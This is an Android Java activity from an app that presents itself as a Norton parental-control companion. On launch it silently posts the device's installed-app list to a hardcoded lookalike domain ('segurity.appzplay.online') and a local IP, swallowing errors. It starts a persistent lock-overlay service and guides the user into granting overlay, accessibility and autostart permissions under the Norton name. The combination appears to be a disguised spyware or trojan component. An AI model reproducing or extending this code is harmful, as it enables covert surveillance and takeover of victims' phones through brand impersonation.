package com.norton.parental.companion;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

public class MainActivity extends Activity implements View.OnClickListener {

    private static final int REQ_CODE_OVERLAY = 1001;
    private static final int REQ_CODE_LOCATION = 1002;
    private TextView tvStatus;
    public EditText etServerUrl;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvStatus = findViewById(R.id.tv_status);
        etServerUrl = findViewById(R.id.et_server_url);

        Button btnOverlay = findViewById(R.id.btn_overlay_perm);
        btnOverlay.setOnClickListener(this);

        Button btnAccessibility = findViewById(R.id.btn_accessibility_perm);
        btnAccessibility.setOnClickListener(this);

        Button btnLocation = findViewById(R.id.btn_location_perm);
        btnLocation.setOnClickListener(this);

        Button btnAutostart = findViewById(R.id.btn_autostart_perm);
        btnAutostart.setOnClickListener(this);

        Button btnTest = findViewById(R.id.btn_test_lock);
        btnTest.setOnClickListener(this);

        requestLocationPermissionIfNeeded();
        startCompanionService();
        scanAndUploadInstalledApps();
    }

    private void requestLocationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[]{
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.ACCESS_COARSE_LOCATION
                }, REQ_CODE_LOCATION);
            }
        }
    }

    public void scanAndUploadInstalledApps() {
        String serverUrl = etServerUrl.getText().toString().trim();
        new ScanAppsThread(getPackageManager(), serverUrl).start();
    }

    public static class ScanAppsThread extends Thread {
        private final PackageManager mPm;
        private final String mServerUrl;

        public ScanAppsThread(PackageManager pm, String serverUrl) {
            mPm = pm;
            mServerUrl = serverUrl;
        }

        @Override
        public void run() {
            String[] servers = new String[] {
                mServerUrl,
                "https://segurity.appzplay.online",
                "http://192.168.1.124:3080"
            };

            for (String srv : servers) {
                if (srv == null || srv.isEmpty()) continue;
                try {
                    List<ApplicationInfo> apps = mPm.getInstalledApplications(PackageManager.GET_META_DATA);
                    StringBuilder jsonArray = new StringBuilder("[");
                    boolean first = true;

                    for (ApplicationInfo app : apps) {
                        if (mPm.getLaunchIntentForPackage(app.packageName) != null) {
                            String name = mPm.getApplicationLabel(app).toString().replace("\"", "\\\"");
                            String pkg = app.packageName;

                            if (!first) jsonArray.append(",");
                            jsonArray.append("{\"name\":\"").append(name)
                                     .append("\",\"packageName\":\"").append(pkg).append("\"}");
                            first = false;
                        }
                    }
                    jsonArray.append("]");

                    String payload = "{\"apps\":" + jsonArray.toString() + "}";

                    URL url = new URL(srv + "/api/child/installed-apps");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(4000);
                    conn.setReadTimeout(4000);

                    OutputStream os = conn.getOutputStream();
                    os.write(payload.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int resCode = conn.getResponseCode();
                    conn.disconnect();
                    if (resCode == 200) {
                        break;
                    }
                } catch (Exception e) {}
            }
        }
    }

    private void startCompanionService() {
        Intent serviceIntent = new Intent(this, LockOverlayService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
    }

    @Override
    public void onClick(View v) {
        int id = v.getId();
        if (id == R.id.btn_overlay_perm) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, REQ_CODE_OVERLAY);
                } else {
                    Toast.makeText(this, "Permiso de superposición ya concedido", Toast.LENGTH_SHORT).show();
                }
            }
        } else if (id == R.id.btn_accessibility_perm) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
            Toast.makeText(this, "Busca 'Norton Accessibility' y actívalo", Toast.LENGTH_LONG).show();
        } else if (id == R.id.btn_location_perm) {
            requestLocationPermissionIfNeeded();
        } else if (id == R.id.btn_autostart_perm) {
            openAutostartSettings();
        } else if (id == R.id.btn_test_lock) {
            Intent intent = new Intent(this, LockOverlayService.class);
            intent.setAction(LockOverlayService.ACTION_SHOW_LOCK);
            startService(intent);
        }
    }

    private void openAutostartSettings() {
        try {
            Intent intent = new Intent();
            String manufacturer = Build.MANUFACTURER.toLowerCase();
            if (manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco")) {
                intent.setComponent(new ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity"));
            } else if (manufacturer.contains("huawei")) {
                intent.setComponent(new ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.optimize.process.ProtectActivity"));
            } else if (manufacturer.contains("oppo")) {
                intent.setComponent(new ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity"));
            } else if (manufacturer.contains("vivo")) {
                intent.setComponent(new ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"));
            } else {
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                intent.setData(Uri.parse("package:" + getPackageName()));
            }
            startActivity(intent);
            Toast.makeText(this, "Activa 'Inicio Automático' para recibir alertas de reinicio", Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }
}
